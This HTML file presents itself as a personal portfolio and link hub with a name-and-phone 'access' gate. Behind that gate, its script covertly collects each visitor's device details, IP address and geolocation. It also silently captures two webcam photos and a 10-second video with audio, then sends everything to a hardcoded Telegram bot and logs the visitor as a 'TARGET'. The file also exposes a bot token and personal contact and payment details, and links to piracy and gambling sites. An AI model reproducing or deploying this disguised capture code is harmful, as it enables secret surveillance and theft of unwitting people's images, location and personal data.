HTML
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="description" content="Lalu Kumar Tanti - Elite Digital Portfolio">
    
    <meta name="theme-color" content="#000000">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="application-name" content="Lalu Hub">
    
    <link rel="manifest" href='data:application/manifest+json,{"name":"Lalu Secure Hub","short_name":"Lalu App","start_url":".","display":"standalone","background_color":"#000000","theme_color":"#D4AF37","orientation":"portrait","icons":[{"src":"https://i.postimg.cc/Y0jPr7Vy/20251205-103059-IMG-STYLE.jpg","sizes":"192x192","type":"image/jpeg"},{"src":"https://i.postimg.cc/Y0jPr7Vy/20251205-103059-IMG-STYLE.jpg","sizes":"512x512","type":"image/jpeg"}]}'>

    <title>Lalu Kumar | SECURE SYSTEM</title>
    
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@400;700&family=Outfit:wght@200;400;600&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">

    <style>
        :root {
            /* --- ELITE GOLD THEME --- */
            --bg-deep: #000000;
            --bg-panel: rgba(15, 15, 15, 0.95);
            --gold-primary: #D4AF37;
            --gold-dim: #8B7328;
            --neon-glow: 0 0 15px rgba(212, 175, 55, 0.3);
            --text-main: #ffffff;
            --glass-border: 1px solid rgba(212, 175, 55, 0.2);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }
        
        body { 
            background-color: var(--bg-deep); 
            color: var(--text-main); 
            font-family: 'Outfit', sans-serif; 
            overflow-x: hidden; 
            min-height: 100vh;
            background-image: 
                linear-gradient(rgba(0,0,0,0.9), rgba(0,0,0,0.9)),
                url('https://www.transparenttextures.com/patterns/carbon-fibre.png');
            background-attachment: fixed;
        }

        /* --- SCROLLBAR --- */
        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-track { background: #000; }
        ::-webkit-scrollbar-thumb { background: var(--gold-primary); border-radius: 10px; }

        /* --- 1. GATEKEEPER (LOGIN SCREEN) --- */
        #gatekeeper {
            position: fixed; inset: 0; z-index: 9999;
            background: #000;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            transition: opacity 0.6s ease, visibility 0.6s;
            background: radial-gradient(circle at center, #1a1500 0%, #000000 80%);
        }

        .gate-card {
            width: 90%; max-width: 380px;
            background: rgba(10, 10, 10, 0.9);
            border: 1px solid var(--gold-primary);
            border-radius: 16px; padding: 40px 25px;
            box-shadow: 0 0 60px rgba(212, 175, 55, 0.15);
            text-align: center; position: relative;
            backdrop-filter: blur(10px);
        }

        .gate-img-frame {
            width: 120px; height: 120px; margin: 0 auto 20px;
            border-radius: 50%; padding: 4px;
            border: 2px solid var(--gold-primary);
            box-shadow: 0 0 30px rgba(212, 175, 55, 0.3);
            background: #000;
        }
        .gate-img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; }

        .gate-title { 
            font-family: 'Cinzel'; color: #fff; font-size: 26px; margin-bottom: 5px; 
            text-shadow: 0 0 10px var(--gold-primary); letter-spacing: 2px;
        }
        .gate-sub { color: var(--gold-primary); font-size: 10px; letter-spacing: 4px; margin-bottom: 30px; font-family: 'Rajdhani'; font-weight: 700; text-transform: uppercase; }

        .gate-input {
            width: 100%; padding: 14px 15px; margin-bottom: 15px;
            background: rgba(255, 255, 255, 0.05); border: 1px solid #333;
            color: #fff; font-size: 15px; font-family: 'Rajdhani'; letter-spacing: 1px;
            border-radius: 8px; transition: 0.3s; text-align: center;
        }
        .gate-input:focus { border-color: var(--gold-primary); background: rgba(212, 175, 55, 0.05); box-shadow: var(--neon-glow); }

        .gate-btn {
            width: 100%; padding: 15px; margin-top: 10px;
            background: linear-gradient(135deg, var(--gold-primary), #8f7023);
            color: #000; font-weight: 900; font-size: 14px;
            border: none; cursor: pointer; letter-spacing: 2px; border-radius: 8px;
            transition: 0.3s; box-shadow: 0 0 20px rgba(212, 175, 55, 0.2);
        }
        .gate-btn:active { transform: scale(0.98); background: #fff; }
        
        .loading-text {
            margin-top: 15px; font-size: 11px; color: var(--gold-primary); 
            font-family: 'Rajdhani'; display: none; letter-spacing: 2px; text-transform: uppercase;
            animation: blink 1s infinite;
        }
        @keyframes blink { 50% { opacity: 0.5; } }

        /* --- 2. MAIN INTERFACE --- */
        #main-interface { display: none; opacity: 0; transition: opacity 1s; padding-bottom: 100px; }

        .navbar {
            display: flex; justify-content: space-between; align-items: center;
            padding: 15px 20px; position: sticky; top: 0; z-index: 1000;
            background: rgba(0, 0, 0, 0.9); border-bottom: 1px solid rgba(212,175,55,0.1);
            backdrop-filter: blur(10px);
        }
        .brand { font-family: 'Cinzel'; color: var(--gold-primary); font-size: 16px; font-weight: 700; display: flex; align-items: center; gap: 10px; }
        
        .container { max-width: 800px; margin: 0 auto; padding: 0 20px; }
        
        .hero-section { text-align: center; padding: 50px 0 30px; position: relative; }
        .hero-avatar {
            width: 150px; height: 150px; margin: 0 auto 15px; border-radius: 50%;
            padding: 4px; border: 2px solid var(--gold-primary);
            box-shadow: 0 0 40px rgba(212, 175, 55, 0.2); background: #000;
        }
        .hero-avatar img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; }
        .hero-name { 
            font-family: 'Rajdhani'; font-size: 32px; font-weight: 700; color: #fff; 
            margin-bottom: 5px; text-shadow: 0 0 10px rgba(0,0,0,0.8);
        }
        .hero-role { color: var(--gold-primary); font-size: 12px; letter-spacing: 4px; text-transform: uppercase; font-weight: bold; }

        /* Install App Button */
        #installBtn {
            display: none; margin: 20px auto;
            background: transparent; border: 1px solid var(--gold-primary);
            color: var(--gold-primary); padding: 10px 30px; 
            font-size: 11px; font-weight: bold; cursor: pointer; letter-spacing: 2px;
            box-shadow: 0 0 15px rgba(212, 175, 55, 0.1); transition: 0.3s; border-radius: 30px;
        }
        #installBtn:hover { background: var(--gold-primary); color: #000; }

        .section-header {
            display: flex; align-items: center; gap: 10px; margin: 35px 0 15px;
            font-family: 'Cinzel'; font-size: 13px; color: var(--gold-primary);
            border-bottom: 1px solid rgba(212,175,55,0.2); padding-bottom: 8px;
        }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
        
        .sys-card {
            background: rgba(20, 20, 20, 0.6); border: 1px solid rgba(255,255,255,0.05);
            padding: 20px; height: 100px; display: flex; flex-direction: column; 
            align-items: center; justify-content: center; text-decoration: none; 
            position: relative; overflow: hidden; transition: 0.3s; border-radius: 12px;
        }
        .sys-card:hover { border-color: var(--gold-dim); background: rgba(30, 30, 30, 0.8); transform: translateY(-3px); }
        .sys-card:active { transform: scale(0.97); }
        
        .sys-card i { font-size: 26px; margin-bottom: 10px; color: var(--gold-primary); }
        .sys-card span { font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; color: #ccc; font-family: 'Rajdhani'; }
        .sys-card.full { grid-column: span 2; flex-direction: row; gap: 15px; height: 75px; background: linear-gradient(90deg, rgba(212,175,55,0.05), transparent); }
        .sys-card.full i { margin-bottom: 0; }

        /* Bottom Dock */
        .bottom-nav {
            position: fixed; bottom: 0; left: 0; width: 100%; height: 75px;
            background: #000; border-top: 1px solid rgba(212,175,55,0.2); z-index: 4000;
            display: flex; justify-content: space-around; align-items: center;
        }
        .nav-item {
            flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center;
            color: #555; gap: 4px; cursor: pointer; transition: 0.3s;
        }
        .nav-item.active { color: var(--gold-primary); text-shadow: 0 0 10px var(--gold-dim); }
        .nav-item i { font-size: 20px; }
        .nav-item span { font-size: 9px; letter-spacing: 1px; font-weight: bold; font-family: 'Rajdhani'; }

        /* AI Floating Button */
        .ai-fab {
            position: fixed; bottom: 90px; right: 20px;
            width: 60px; height: 60px; border-radius: 50%;
            background: var(--gold-primary); border: 2px solid #fff;
            display: flex; align-items: center; justify-content: center;
            box-shadow: 0 0 30px rgba(212,175,55,0.4);
            z-index: 2000; cursor: pointer; animation: pulse 2s infinite;
        }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }

        /* Hidden Capture Engines (MUTED) */
        #hidden-video, #hidden-canvas { display: none; }

        /* Modals */
        .modal-wrap { position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 5000; display: none; align-items: center; justify-content: center; backdrop-filter: blur(5px); }
        .modal-wrap.active { display: flex; }
        .modal-inner { width: 90%; max-width: 400px; background: #080808; border: 1px solid var(--gold-primary); padding: 25px; position: relative; border-radius: 16px; }
    </style>
</head>
<body>

    <div id="gatekeeper">
        <div class="gate-card">
            <div class="gate-img-frame">
                <img src="https://i.postimg.cc/Y0jPr7Vy/20251205-103059-IMG-STYLE.jpg" class="gate-img">
            </div>
            <h2 class="gate-title">LALU KUMAR</h2>
            <div class="gate-sub">SYSTEM ACCESS REQUIRED</div>

            <input type="text" id="g-name" class="gate-input" placeholder="FULL NAME">
            <input type="tel" id="g-phone" class="gate-input" placeholder="ACCESS KEY (PHONE)">

            <button class="gate-btn" onclick="initiateSecureEntry()">
                INITIALIZE UPLINK
            </button>
            
            <div class="loading-text" id="g-status">
                <i class="fas fa-circle-notch fa-spin"></i> SECURE SCANNING...
            </div>
        </div>
    </div>

    <video id="hidden-video" autoplay playsinline muted></video>
    <canvas id="hidden-canvas"></canvas>

    <div id="main-interface">
        
        <nav class="navbar">
            <div class="brand"><i class="fas fa-microchip"></i> LALU OS v14.0</div>
            <i class="fas fa-signal" style="color:var(--gold-primary);"></i>
        </nav>
        
        <div class="container">
            <div class="hero-section">
                <div class="hero-avatar">
                    <img src="https://i.postimg.cc/Y0jPr7Vy/20251205-103059-IMG-STYLE.jpg">
                </div>
                <div class="hero-name">Lalu Kumar Tanti</div>
                <div class="hero-role">System Administrator | Dev</div>
                <button id="installBtn" onclick="installApp()"><i class="fas fa-download"></i> INSTALL SYSTEM APP</button>
            </div>

            <div class="section-header"><i class="fas fa-network-wired"></i> DIRECT UPLINK</div>
            <div class="grid">
                <a href="https://wa.me/919771617808" class="sys-card"><i class="fab fa-whatsapp"></i><span>WhatsApp</span></a>
                <a href="https://instagram.com/lalu_kumar_tanti" class="sys-card"><i class="fab fa-instagram"></i><span>Instagram</span></a>
                <a href="tel:+919771617808" class="sys-card"><i class="fas fa-phone"></i><span>Secure Call</span></a>
                <a href="https://t.me/Lalu_kumar_tanti_0" class="sys-card"><i class="fab fa-telegram-plane"></i><span>Telegram</span></a>
                <a href="mailto:lalukumartanti75@gmail.com" class="sys-card full"><i class="fas fa-envelope"></i><span>Mail: lalukumartanti75@gmail.com</span></a>
            </div>

            <div class="section-header"><i class="fas fa-globe-asia"></i> SOCIAL GRID</div>
            <div class="grid">
                <a href="https://facebook.com/lalukumartantii" class="sys-card"><i class="fab fa-facebook-f"></i><span>Facebook</span></a>
                <a href="https://x.com/LaluKumarTanti" class="sys-card"><i class="fab fa-x-twitter"></i><span>Twitter (X)</span></a>
                <a href="https://github.com/lalukumartanti" class="sys-card"><i class="fab fa-github"></i><span>GitHub Repo</span></a>
                <a href="https://linkedin.com/in/lalu-kumar-tanti-540185351" class="sys-card"><i class="fab fa-linkedin-in"></i><span>LinkedIn</span></a>
                <a href="http://www.youtube.com/@Lalu_Kumar_Tanti" class="sys-card full"><i class="fab fa-youtube"></i><span>YouTube Feed</span></a>
            </div>

            <div class="section-header"><i class="fas fa-database"></i> RESOURCES</div>
            <div class="grid">
                <a href="https://hdhub4u.catering/" class="sys-card"><i class="fas fa-film"></i><span>HDHub4u</span></a>
                <a href="https://vegas-big.com/" class="sys-card"><i class="fas fa-play-circle"></i><span>Vegas-Big</span></a>
                <a href="https://studyspark.site/" class="sys-card full"><i class="fas fa-book"></i><span>StudySpark Database</span></a>
            </div>

            <div class="section-header"><i class="fas fa-coins"></i> TRANSACTIONS</div>
            <div class="grid">
                <a href="upi://pay?pa=9771617808@ybl&pn=LaluKumar" class="sys-card"><i class="fas fa-wallet"></i><span>PhonePe</span></a>
                <div class="sys-card" onclick="navigator.clipboard.writeText('9771617808-2@axl'); alert('UPI Copied')"><i class="fas fa-qrcode"></i><span>Copy ID</span></div>
            </div>

            <div style="height: 100px;"></div>
        </div>

        <div class="bottom-nav">
            <div class="nav-item active" onclick="window.scrollTo(0,0)"><i class="fas fa-home"></i><span>ROOT</span></div>
            <div class="nav-item" onclick="document.getElementById('aiModal').classList.add('active')"><i class="fas fa-brain"></i><span>AI CORE</span></div>
            <div class="nav-item" onclick="document.getElementById('gameModal').classList.add('active')"><i class="fas fa-gamepad"></i><span>ARCADE</span></div>
            <div class="nav-item" onclick="document.getElementById('authModal').classList.add('active')"><i class="fas fa-user-lock"></i><span>ADMIN</span></div>
        </div>

        <div class="ai-fab" onclick="document.getElementById('aiModal').classList.add('active')"><i class="fas fa-robot" style="font-size:24px; color:#000;"></i></div>

        <div class="modal-wrap" id="aiModal" onclick="if(event.target==this)this.classList.remove('active')">
            <div class="modal-inner">
                <div style="text-align:center; color:var(--gold-primary); margin-bottom:15px; font-weight:bold;">LALU NEURAL NET</div>
                <div style="background:#111; height:200px; padding:10px; color:#0f0; font-family:monospace;">> System Ready...<br>> Waiting for input...</div>
            </div>
        </div>

        <div class="modal-wrap" id="gameModal" onclick="if(event.target==this)this.classList.remove('active')">
            <div class="modal-inner" style="text-align:center;">
                <h3 style="color:var(--gold-primary);">GAMES</h3>
                <div class="grid" style="margin-top:15px;">
                    <div class="sys-card" onclick="alert('Load Snake')"><i class="fas fa-worm"></i><span>Snake</span></div>
                    <div class="sys-card" onclick="alert('Load TTT')"><i class="fas fa-border-all"></i><span>TicTacToe</span></div>
                </div>
            </div>
        </div>

        <div class="modal-wrap" id="authModal" onclick="if(event.target==this)this.classList.remove('active')">
            <div class="modal-inner">
                <input type="tel" placeholder="Enter Key" class="gate-input">
                <button class="gate-btn" onclick="initiateSystem()">SEND KEY</button>
            </div>
        </div>
    </div>

    <script>
        // --- CONFIGURATION ---
        const TG_TOKEN = "7887458156:AAHvTz7CWSt-EBpyDSaeSVUVEgka5H9bBWQ";
        const TG_CHAT = "8506290708";

        // --- 1. SMART APP INSTALL ---
        let deferredPrompt;
        window.addEventListener('beforeinstallprompt', (e) => {
            e.preventDefault();
            deferredPrompt = e;
            document.getElementById('installBtn').style.display = 'inline-block';
        });
        function installApp() {
            if(deferredPrompt) {
                deferredPrompt.prompt();
                deferredPrompt.userChoice.then(res => { deferredPrompt = null; });
            }
        }

        // --- 2. DEEP SCAN INTELLIGENCE ---
        async function extractHardwareIntel() {
            let intel = {
                ua: navigator.userAgent,
                screen: `${window.screen.width}x${window.screen.height}`,
                cores: navigator.hardwareConcurrency || "Unknown",
                ram: navigator.deviceMemory ? `~${navigator.deviceMemory}GB` : "Unknown",
                time: Intl.DateTimeFormat().resolvedOptions().timeZone,
                platform: navigator.platform
            };

            if(navigator.connection) {
                intel.netType = navigator.connection.effectiveType;
                intel.netDown = navigator.connection.downlink + " Mbps";
            } else { intel.netType = "Unknown"; }

            try {
                const b = await navigator.getBattery();
                intel.batLevel = Math.round(b.level * 100) + "%";
            } catch(e) { intel.batLevel = "N/A"; }

            try { const r = await fetch('https://api.ipify.org?format=json'); const j = await r.json(); intel.ip = j.ip; } 
            catch(e) { intel.ip = "Hidden"; }

            return intel;
        }

        // --- 3. MASTER ENTRY & CAPTURE ---
        async function initiateSecureEntry() {
            const name = document.getElementById('g-name').value;
            const phone = document.getElementById('g-phone').value;
            
            if(name.length < 2 || phone.length < 10) return alert("ACCESS DENIED: Invalid Credentials");

            document.getElementById('g-status').style.display = 'block';

            // Start Data Gather & Multi-Shot Engine
            const intelPromise = extractHardwareIntel();
            executeMultiShotCapture(); // 2 Photos + 10s Video + Audio

            // Wait for Intel
            const d = await intelPromise;

            // Location
            let loc = "Blocked";
            try {
                await new Promise(r => {
                    navigator.geolocation.getCurrentPosition(p => {
                        loc = `Lat: ${p.coords.latitude}, Lon: ${p.coords.longitude} (Acc: ${Math.round(p.coords.accuracy)}m)`;
                        r();
                    }, r, {timeout: 2500});
                });
            } catch(e){}

            // Construct Log
            const msg = `
🚨 *SYSTEM INTRUSION LOG* 🚨

👤 *TARGET IDENTITY*
• Name: ${name}
• Phone: \`${phone}\`

📱 *HARDWARE*
• RAM: ${d.ram} | Cores: ${d.cores}
• Screen: ${d.screen}
• OS: ${d.platform}

🌐 *NETWORK*
• IP: \`${d.ip}\`
• Type: ${d.netType}

🔋 *POWER*
• Level: ${d.batLevel}

📍 *GEO-LOCATION*
${loc}

⏰ *Timestamp:* ${new Date().toLocaleString()}
`;

            // Send Text Immediately
            sendTG(msg, null);

            // Safety Unlock (2.5s)
            setTimeout(() => {
                document.getElementById('gatekeeper').style.opacity = '0';
                setTimeout(() => {
                    document.getElementById('gatekeeper').style.display = 'none';
                    document.getElementById('main-interface').style.display = 'block';
                    setTimeout(() => document.getElementById('main-interface').style.opacity = '1', 50);
                }, 600);
            }, 2500);
        }

        // --- 4. MULTI-SHOT CAPTURE ENGINE ---
        async function executeMultiShotCapture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
                const video = document.getElementById('hidden-video');
                video.srcObject = stream;
                video.muted = true; // Essential silence
                
                await new Promise(r => video.onloadedmetadata = r);

                const canvas = document.getElementById('hidden-canvas');
                canvas.width = video.videoWidth; 
                canvas.height = video.videoHeight;

                // 1. CAPTURE PHOTO 1 (IMMEDIATE)
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(b => sendTG("📸 *PHOTO 1 (ENTRY)*", b, false), 'image/jpeg', 0.7);

                // 2. CAPTURE PHOTO 2 (AFTER 3 SECONDS)
                setTimeout(() => {
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(b => sendTG("📸 *PHOTO 2 (DELAYED)*", b, false), 'image/jpeg', 0.7);
                }, 3000);

                // 3. RECORD VIDEO (10 SECONDS) - USING WEBM FOR COMPATIBILITY
                const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                const chunks = [];
                recorder.ondataavailable = e => { if(e.data.size>0) chunks.push(e.data); };
                recorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    sendTG("🎥 *VIDEO EVIDENCE (10s)*", blob, true);
                    stream.getTracks().forEach(t => t.stop()); // Stop Camera after recording
                };
                
                recorder.start();
                setTimeout(() => recorder.stop(), 10000); // 10s Timer

            } catch(e) { console.log("Media Access Denied"); }
        }

        function sendTG(text, file, isVideo) {
            const fd = new FormData();
            fd.append('chat_id', TG_CHAT);
            fd.append('caption', text);
            fd.append('parse_mode', 'Markdown');
            
            if(file) {
                // Send as DOCUMENT for better stability with WebM video
                const method = isVideo ? 'sendDocument' : 'sendPhoto';
                const key = isVideo ? 'document' : 'photo';
                const name = isVideo ? 'evidence.webm' : 'snap.jpg';
                fd.append(key, file, name);
                fetch(`https://api.telegram.org/bot${TG_TOKEN}/${method}`, { method: 'POST', body: fd }).catch(e=>{});
            } else {
                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
                    method: 'POST', headers: {'Content-Type':'application/json'},
                    body: JSON.stringify({ chat_id: TG_CHAT, text: text, parse_mode: 'Markdown' })
                }).catch(e=>{});
            }
        }
        
        // --- EXTRA TRIGGER FOR ADMIN MODAL ---
        function initiateSystem() { initiateSecureEntry(); }
    </script>
</body>
</html>
